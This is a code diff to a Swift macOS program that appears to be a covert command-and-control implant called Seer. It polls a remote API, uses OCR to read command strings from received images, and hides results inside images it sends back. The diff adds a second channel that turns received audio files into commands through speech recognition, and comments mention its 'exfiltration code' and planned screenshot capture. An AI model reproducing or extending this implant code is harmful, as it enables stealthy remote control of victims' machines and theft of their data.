@@ -10,6 +10,7 @@ import Vision
 import AppKit
 import UniformTypeIdentifiers
 import ASH
+import Speech
 
 // Sanatize inputs
 public extension String {
@@ -122,7 +123,7 @@ private struct directory {
 }
 
 // This struct performs all the actions to format the JSON and to call the proper API for dynamo
-private struct commandComms {
+private class commandComms {
     var action: String!
     var hostname: String
     var command: String!
@@ -142,7 +143,7 @@ private struct commandComms {
     }
 
     // Set the json
-    mutating func postFormat() {
+    func postFormat() {
         // Create the json Structure for a String command
         let encoder = JSONEncoder()
         url = urlDomain + "/prod/POST"
@@ -158,7 +159,7 @@ private struct commandComms {
         }
     }
     
-    mutating func hostInit() {
+    func hostInit() {
         // Call the init API
         let encoder = JSONEncoder()
         url = urlDomain + "/prod/seerInit"
@@ -166,7 +167,7 @@ private struct commandComms {
         encode = try! encoder.encode(initRequest)
     }
     
-    mutating func getFormat() {
+    func getFormat() {
         // Call the get API
         let encoder = JSONEncoder()
         url = urlDomain + "/prod/seerGet"
@@ -175,9 +176,10 @@ private struct commandComms {
     }
     
     // Communicate the JSON
-    mutating func jsonSend(path: String) async {
+    func jsonSend(path: String) async {
         // Setup the ML struct
         let imageProcess = imageML()
+        let audioProcess = audioML()
         
         switch path {
         case "POST":
@@ -196,24 +198,35 @@ private struct commandComms {
         
         // Decode the JSON we receive when Get is called
         print(path)
-
+        
         // TODO: Check if theres a way to get a status code and check if it is 404. Not really necessary right now
         if path == "seerGet" && !(String(data: netResponse, encoding: .utf8)?.contains("No messages"))! && !(String(data: netResponse, encoding: .utf8)?.contains("Messages"))!{
+//            print(String(data: netResponse, encoding: .utf8))
             let decoder = JSONDecoder()
             let getBody = try! decoder.decode(bodyResponse.bodyData.self, from: netResponse)
             self.randImg = Data(base64Encoded: getBody.randImage)
             
-            // In future, a check needs to be done to see if the app is running in file mode. For an MVP, this is fine
-            imageProcess.imageData = Data(base64Encoded: getBody.body)
-            
-            // Run the ML
-            imageProcess.mlSetup()
-            commResult = imageProcess.recognizedStrings
+            // Check what kind of file
+            if getBody.fileType.contains("image") {
+                // In future, a check needs to be done to see if the app is running in file mode. For an MVP, this is fine
+                imageProcess.imageData = Data(base64Encoded: getBody.body)
+                
+                // Run the ML
+                imageProcess.mlSetup()
+                commResult = imageProcess.recognizedStrings
+            }
+            else if getBody.fileType.contains("audio") {
+                audioProcess.writeFile(fileData: Data(base64Encoded: getBody.body)!)
+                audioProcess.speechRecognition { transcription in
+                    audioProcess.processedAudio = [audioProcess.normalize(audioProcess.results)]
+                    self.commResult = audioProcess.processedAudio
+                }
+            }
         }
     }
     
     // This function is used to add text to images. This is done by receiving an image from Seer and placing text into the image to then send back to Seer
-    mutating func imageProcessing() async {
+    func imageProcessing() async {
         let image = imageCreation(inText: result!, inImage: NSImage(data: self.randImg)!, imgCoordinate: CGPoint(x: 20, y: -20))
         let bitmap = NSBitmapImageRep(cgImage: image.cgImage(forProposedRect: nil, context: nil, hints: nil)!)
         let bitmapData = bitmap.representation(using: .jpeg, properties: [:])
@@ -224,7 +237,7 @@ private struct commandComms {
     }
     
     // Add text to an image based on the coordinate
-    private func imageCreation(inText: String, inImage: NSImage, imgCoordinate: CGPoint) -> NSImage {
+    func imageCreation(inText: String, inImage: NSImage, imgCoordinate: CGPoint) -> NSImage {
         // Create all the variables needed to set text color, size, and font
         let size = CGSize(width: inImage.size.width, height: inImage.size.height)
         let targetImage = NSImage(size: size, flipped: false) { (destRect: CGRect) -> Bool in
@@ -299,8 +312,59 @@ private class imageML {
             }
         }
     }
+}
+
+private class audioML {
+    var filePath: String = ""
+    var processedAudio: [String] = []
+    var results: String = ""
+    var other: String = ""
     
-    func imageCreation() {
-        
+//        case screenshot This would also be cool but requires rewriting the exfiltration code which has never been explored
+//        case cd This could be interesting...replace every word that says slash with a slash and the user can navigate that way
+    
+    func normalize(_ input: String) -> String {
+        // Normalizes the machine learning input and will work for single word commands
+        input
+            .lowercased()
+            .components(separatedBy: .whitespaces)
+            .joined() + ";"
+    }
+
+    func writeFile(fileData: Data) {
+        let tempDir = NSTemporaryDirectory()
+        let filename = UUID().uuidString + ".wav"
+        filePath = (tempDir as NSString).appendingPathComponent(filename)
+        do {
+            try fileData.write(to: URL(fileURLWithPath: filePath))
+            print("File was written successfully")
+        } catch {
+            self.processedAudio.append("Error writing file")
+        }
+    }
+
+    func speechRecognition(completion: @escaping (String?) -> Void) {
+        let speechRecognizer = SFSpeechRecognizer()
+        let request = SFSpeechURLRecognitionRequest(url: URL(fileURLWithPath: filePath))
+
+        SFSpeechRecognizer.requestAuthorization { authStatus in
+            guard authStatus == .authorized else {
+                print("Authorization failed...")
+                completion(nil)
+                return
+            }
+
+            speechRecognizer?.recognitionTask(with: request, resultHandler: { (result, error) in
+                if let error = error {
+                    print("Error: \(error.localizedDescription)")
+                    completion(nil)
+                }
+
+                if let result = result, result.isFinal {
+                    self.results = result.bestTranscription.formattedString
+                    completion(self.results)
+                }
+            })
+        }
     }
 }
